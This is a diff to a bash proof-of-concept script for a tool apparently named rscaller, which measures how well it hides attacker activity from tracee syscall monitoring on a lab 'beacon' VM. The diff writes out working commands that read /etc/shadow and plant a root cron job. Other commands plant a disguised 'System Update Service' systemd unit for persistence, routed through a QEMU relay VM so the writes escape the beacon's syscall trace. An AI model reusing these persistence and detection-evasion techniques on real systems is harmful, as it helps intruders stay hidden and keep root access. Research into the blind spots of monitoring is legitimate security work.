@@ -49,13 +49,23 @@
 # Scenarios (--scenario NAME), each is a --compare run:
 #   exec     — cat /etc/shadow via ghost's /mnt/target FUSE anchor vs. cat
 #              /etc/shadow directly on the beacon. Watches execve/execveat.
-#   file     — plant a cron.d entry via ghost's /mnt/target vs. planting the
-#              same entry directly on the beacon. Watches execve/execveat +
-#              security_file_open,magic_write, queries for "cron".
+#   file     — plant a cron.d entry via the QEMU relay VM (raw write to the
+#              beacon's disk from inside the guest, invisible to the beacon's
+#              syscall trace) vs. writing straight to the beacon's live
+#              /etc/cron.d. Watches execve/execveat +
+#              security_file_open,magic_write, queries for "rscaller-poc"
+#              (the filename — "cron" would match the cron daemon's routine
+#              activity and flood the count).
 #   network  — curl-download linpeas.sh via the relay profile (network
 #              syscalls forwarded, file lands on the CLIENT) vs. curling it
 #              directly on the beacon. Watches execve/execveat +
 #              security_socket_connect,net_packet_tcp,net_packet_udp,net_packet_dns.
+#   qemu     — plant a fake systemd unit (systemd-update.service + enable
+#              symlink) on the beacon's scratch disk /dev/vdb through the QEMU
+#              relay VM (device I/O inside the guest, invisible to the
+#              beacon's syscall trace) vs. mounting /dev/vdb on the beacon and
+#              writing directly. Watches execve/execveat +
+#              security_file_open,magic_write, queries for "systemd-update".
 #
 # Examples:
 #   bash scripts/poc.sh --profile recon
@@ -90,6 +100,7 @@ BASELINE_CMD=""
 COMPARE=0
 CLEANUP_CMD=""
 SCENARIO=""
+RSC_EXTRA_ARGS=""
 
 # Track which fields the caller passed explicitly, so --scenario presets
 # never clobber an explicit flag.
@@ -210,15 +221,22 @@ if [[ -n "$SCENARIO" ]]; then
 		COMPARE=1
 		;;
 	file)
-		[[ "$PROFILE_SET" -eq 1 ]] || PROFILE="ghost"
-		# rsc execs argv directly (no shell) — anything using '>' or quoting
-		# needs its own sh -c wrapper, which then runs *inside* the child's
-		# mount namespace so /mnt/target is visible when the redirect opens.
-		[[ "$CMD_SET" -eq 1 ]] || CMD="sh -c 'echo \"* * * * * root /tmp/.rscaller-poc\" > /mnt/target/etc/cron.d/rscaller-poc'"
-		[[ "$BASELINE_CMD_SET" -eq 1 ]] || BASELINE_CMD='sudo sh -c "echo \"* * * * * root /tmp/.rscaller-poc\" > /etc/cron.d/rscaller-poc"'
+		# Plant a cron.d entry: evasion side writes to the beacon's disk through
+		# the QEMU relay VM (raw device I/O inside the guest, invisible to the
+		# beacon's syscall trace); baseline writes straight to the beacon's live
+		# /etc/cron.d — what an attacker without rscaller must do. Cleanup runs
+		# right after the baseline capture stops (outside any tracee window) so
+		# the beacon's cron daemon never opens the planted file during the
+		# evasion window.
+		# Query is the filename, NOT "cron" — that matches the cron daemon's
+		# routine minute tick (PAM/ld.so noise) and floods the count.
+		[[ "$PROFILE_SET" -eq 1 ]] || PROFILE="qemu-relay"
+		[[ "$CMD_SET" -eq 1 ]] || CMD="sh -c 'mkdir -p /mnt/relay/etc/cron.d; echo \"* * * * * root /tmp/.rscaller-poc\" > /mnt/relay/etc/cron.d/rscaller-poc; sync; cat /mnt/relay/etc/cron.d/rscaller-poc'"
+		[[ "$BASELINE_CMD_SET" -eq 1 ]] || BASELINE_CMD='sudo sh -c '"'"'echo "* * * * * root /tmp/.rscaller-poc" > /etc/cron.d/rscaller-poc; sync; cat /etc/cron.d/rscaller-poc'"'"''
 		[[ "$EVENTS_SET" -eq 1 ]] || TRACEE_EVENTS="execve,execveat,security_file_open,magic_write"
-		[[ "$QUERY_SET" -eq 1 ]] || QUERY="cron"
-		[[ "$CLEANUP_CMD_SET" -eq 1 ]] || CLEANUP_CMD="sudo rm -f /etc/cron.d/rscaller-poc"
+		[[ "$QUERY_SET" -eq 1 ]] || QUERY="rscaller-poc"
+		[[ "$CLEANUP_CMD_SET" -eq 1 ]] || CLEANUP_CMD="rm -f /etc/cron.d/rscaller-poc"
+		RSC_EXTRA_ARGS="--encryption none --relay-artifacts /var/lib/libvirt/images/rscaller-relay --relay-device /dev/vdb"
 		COMPARE=1
 		;;
 	network)
@@ -231,8 +249,25 @@ if [[ -n "$SCENARIO" ]]; then
 		[[ "$CLEANUP_CMD_SET" -eq 1 ]] || CLEANUP_CMD="rm -f /tmp/linpeas.sh"
 		COMPARE=1
 		;;
+	qemu)
+		# Plant a fake systemd unit (+ enable symlink) on the beacon's scratch
+		# disk /dev/vdb: evasion side goes through the QEMU relay VM (raw device
+		# I/O inside the guest, nothing on the beacon's syscall trace); baseline
+		# mounts /dev/vdb on the beacon directly. vdb is throwaway ext4 — files
+		# are overwritten each run; umount guard in case the baseline write
+		# chain fails mid-way.
+		UNIT='[Unit]\nDescription=System Update Service\nAfter=network-online.target\n\n[Service]\nType=oneshot\nExecStart=/usr/local/bin/systemd-update --apply\n\n[Install]\nWantedBy=multi-user.target\n'
+		[[ "$PROFILE_SET" -eq 1 ]] || PROFILE="qemu-relay"
+		[[ "$CMD_SET" -eq 1 ]] || CMD="sh -c 'mkdir -p /mnt/relay/etc/systemd/system/multi-user.target.wants && printf \"$UNIT\" > /mnt/relay/etc/systemd/system/systemd-update.service && ln -sf ../systemd-update.service /mnt/relay/etc/systemd/system/multi-user.target.wants/systemd-update.service && sync && cat /mnt/relay/etc/systemd/system/systemd-update.service'"
+		[[ "$BASELINE_CMD_SET" -eq 1 ]] || BASELINE_CMD="sudo sh -c 'mount /dev/vdb /mnt && mkdir -p /mnt/etc/systemd/system/multi-user.target.wants && printf \"$UNIT\" > /mnt/etc/systemd/system/systemd-update.service && ln -sf ../systemd-update.service /mnt/etc/systemd/system/multi-user.target.wants/systemd-update.service && sync; umount /mnt'"
+		[[ "$EVENTS_SET" -eq 1 ]] || TRACEE_EVENTS="execve,execveat,security_file_open,magic_write"
+		[[ "$QUERY_SET" -eq 1 ]] || QUERY="systemd-update"
+		[[ "$CLEANUP_CMD_SET" -eq 1 ]] || CLEANUP_CMD="umount /mnt"
+		RSC_EXTRA_ARGS="--encryption none --relay-artifacts /var/lib/libvirt/images/rscaller-relay --relay-device /dev/vdb"
+		COMPARE=1
+		;;
 	*)
-		die "Unknown --scenario '$SCENARIO'. Valid: exec file network"
+		die "Unknown --scenario '$SCENARIO'. Valid: exec file network qemu"
 		;;
 	esac
 fi
@@ -271,9 +306,19 @@ MOUNT_POINT="$MOUNT_BASE/$NAME"
 
 # ── Validate profile ─────────────────────────────────────────────────────────
 case "$PROFILE" in
-none | recon | relay | shadow | ghost) ;;
-*) die "Unknown profile '$PROFILE'. Valid: none recon relay shadow ghost" ;;
+none | recon | relay | shadow | ghost | qemu-relay) ;;
+*) die "Unknown profile '$PROFILE'. Valid: none recon relay shadow ghost qemu-relay" ;;
 esac
+
+# ── qemu-relay prerequisites (fail fast with a clear message) ───────────────
+if [[ "$PROFILE" == "qemu-relay" ]]; then
+	ssh "$REMOTE" "virsh list --all >/dev/null 2>&1" ||
+		die "libvirtd not reachable on $REMOTE — QEMU relay unavailable"
+	ssh "$REMOTE" "ls /var/lib/libvirt/images/rscaller-relay/{vmlinuz,initrd.img,rootfs.img} >/dev/null 2>&1" ||
+		die "relay boot artifacts missing on $REMOTE (run make deploy)"
+	ssh "$BEACON_VM" "test -b /dev/vdb" ||
+		die "/dev/vdb scratch disk missing on $BEACON_VM (virsh attach-disk, see AGENTS.md)"
+fi
 
 # ── Validate netstack ────────────────────────────────────────────────────────
 case "$NETSTACK" in
@@ -318,23 +363,29 @@ start_tracee() {
             --privileged --pid=host \
             -v /lib/modules:/lib/modules:ro \
             -v /usr/src:/usr/src:ro \
-            -v /etc/os-release:/etc/os-release:ro \
+            -v /etc/os-release:/etc/os-release-host:ro \
             '$TRACEE_IMAGE' \
-            --output format:json \
+            --output json \
             --events '$TRACEE_EVENTS' \
-            >'$TRACEE_LOG' 2>/dev/null &
+            >'$TRACEE_LOG' 2>&1 &
         echo \$!
     " >/tmp/poc-tracee-pid-$$ 2>/dev/null || true
 	TRACEE_PID=$(cat /tmp/poc-tracee-pid-$$ 2>/dev/null || echo "")
 	rm -f /tmp/poc-tracee-pid-$$
-	sleep 3
+	sleep 8 # tracee eBPF attach takes several seconds; 3s was losing baseline events
+	if ! ssh "$BEACON_VM" "sudo docker ps --filter name='$TRACEE_CONTAINER' --format '{{.Names}}'" 2>/dev/null | grep -q .; then
+		echo "${red}tracee container died during startup. Log:${reset}"
+		ssh "$BEACON_VM" "cat '$TRACEE_LOG' 2>/dev/null" || true
+		die "tracee not running on $BEACON_VM"
+	fi
 }
 
 # stop_tracee_and_filter: kills tracee, prints matched events, sets
 # LAST_EVENT_COUNT to how many survived the (optional) $QUERY filter.
 stop_tracee_and_filter() {
+	sleep 2 # let tracee flush captured events to the log before killing it
 	if [[ -n "${TRACEE_CONTAINER:-}" ]]; then
-		ssh "$BEACON_VM" "sudo docker kill '$TRACEE_CONTAINER' 2>/dev/null || true" 2>/dev/null
+		ssh "$BEACON_VM" "sudo docker kill '$TRACEE_CONTAINER' >/dev/null 2>&1 || true" 2>/dev/null
 	elif [[ -n "${TRACEE_PID:-}" ]]; then
 		ssh "$BEACON_VM" "sudo kill $TRACEE_PID 2>/dev/null || true" 2>/dev/null
 	fi
@@ -354,6 +405,8 @@ for line in sys.stdin:
         e = json.loads(line)
     except Exception:
         continue
+    if 'eventName' not in e:
+        continue
     if e.get('processName','') in motd:
         continue
     haystack = json.dumps(e).lower()
@@ -361,17 +414,26 @@ for line in sys.stdin:
         continue
     evt = e.get('eventName', e.get('syscall','?'))
     proc = e.get('processName','?')
-    pid = e.get('processId','?')
-    ts  = e.get('timestamp','')
-    print(f'  [{ts}] {evt} pid={pid} proc={proc}')
+    args = e.get('args') or []
+    argv = next((a.get('value') for a in args
+                 if isinstance(a, dict) and a.get('name') == 'argv'), None)
+    if argv:
+        cmdline = ' '.join(str(x) for x in argv)
+    else:
+        cmdline = str(next((a.get('value') for a in args
+                            if isinstance(a, dict) and a.get('name') == 'pathname'), ''))
+    if found < 50:
+        print(f'  {evt:<9} {proc:<14} {cmdline}'[:160].rstrip())
     found += 1
+if found > 50:
+    print(f'  ... {found - 50} more')
 print(f'COUNT={found}')
 " 2>/dev/null || echo "COUNT=0")
 	LAST_EVENT_COUNT=$(echo "$out" | grep -o 'COUNT=[0-9]*' | tail -1 | cut -d= -f2)
 	LAST_EVENT_COUNT="${LAST_EVENT_COUNT:-0}"
-	echo "$out" | grep -v '^COUNT='
+	echo "$out" | grep -v '^COUNT=' || true
 	if [[ "$LAST_EVENT_COUNT" -eq 0 ]]; then
-		echo "  (none matched)"
+		echo "  (none matched${QUERY:+ query='$QUERY'})"
 	fi
 }
 
@@ -405,12 +467,19 @@ if [[ "$COMPARE" -eq 1 && "$NO_TRACEE" -eq 0 ]]; then
 	info "command: $BASELINE_CMD"
 	start_tracee
 	set +e
-	run_remote "$BEACON_VM" "$BASELINE_CMD"
+	run_remote "$BEACON_VM" "$BASELINE_CMD" 2>&1 | head -n 8
 	set -e
 	echo ""
 	say "Baseline tracee events (events=${TRACEE_EVENTS}${QUERY:+, query=$QUERY})"
 	stop_tracee_and_filter
 	BASELINE_COUNT="$LAST_EVENT_COUNT"
+	# Clean up the baseline artifact now — outside the capture window and
+	# before the evasion run, so beacon services (e.g. cron) can't trip over
+	# it mid-capture. Step 7 re-runs it best-effort at the end.
+	if [[ -n "$CLEANUP_CMD" ]]; then
+		info "cleanup (outside capture): $CLEANUP_CMD"
+		run_remote "$BEACON_VM" "$CLEANUP_CMD" 2>/dev/null || true
+	fi
 	echo ""
 elif [[ "$COMPARE" -eq 1 ]]; then
 	info "--no-tracee set — skipping baseline capture (nothing to compare)"
@@ -419,7 +488,7 @@ fi
 # ── Step 2: Start tracee for the evasion run (optional) ────────────────────
 TRACEE_PID=""
 if [[ "$NO_TRACEE" -eq 0 ]]; then
-	say "Starting tracee on $BEACON_VM for evasion run (settle 3s)"
+	say "Starting tracee on $BEACON_VM for evasion run (settle 8s)"
 	start_tracee
 	info "tracee running (pid ${TRACEE_PID:-unknown}) → $TRACEE_LOG"
 fi
@@ -429,7 +498,7 @@ BEACON_IP_SSH=$(ssh "$BEACON_VM" "hostname -I | awk '{print \$1}'" 2>/dev/null)
 
 say "Cleaning stale mounts on $REMOTE"
 ssh "$REMOTE" "mkdir -p '$MOUNT_BASE'; \
-    sudo pkill -9 -f '$NAME' 2>/dev/null || true; sleep 0.4; \
+    for p in \$(pgrep -f '$NAME'); do [ \"\$p\" != \"\$\$\" ] && sudo kill -9 \"\$p\" 2>/dev/null || true; done; sleep 0.4; \
     grep -qF '$MOUNT_POINT' /proc/mounts && sudo umount -l '$MOUNT_POINT' 2>/dev/null || true; \
     sudo rm -rf '$MOUNT_POINT' 2>/dev/null || true"
 
@@ -445,8 +514,9 @@ ssh "$REMOTE" \
         --mount-base '$MOUNT_BASE' \
         --name '$NAME' \
         --mount-profile '$PROFILE' \
-        -- $CMD"
-EXIT_CODE=$?
+        $RSC_EXTRA_ARGS \
+        -- $CMD" 2>&1 | grep -v 'Guest agent is not responding\|Domain not found' | head -n 20
+EXIT_CODE=${PIPESTATUS[0]}
 set -e
 echo "─────────────────────────────────────────────────────────────────────────"
 echo ""
@@ -454,7 +524,7 @@ info "exit code: $EXIT_CODE"
 
 # ── Step 5: Cleanup rscfuse ─────────────────────────────────────────────────
 ssh "$REMOTE" \
-	"sudo pkill -9 -f '$NAME' 2>/dev/null || true; sleep 0.4; \
+	"for p in \$(pgrep -f '$NAME'); do [ \"\$p\" != \"\$\$\" ] && sudo kill -9 \"\$p\" 2>/dev/null || true; done; sleep 0.4; \
      grep -qF '$MOUNT_POINT' /proc/mounts && sudo umount -l '$MOUNT_POINT' 2>/dev/null || true; \
      sudo rm -rf '$MOUNT_POINT' 2>/dev/null || true" 2>/dev/null
 
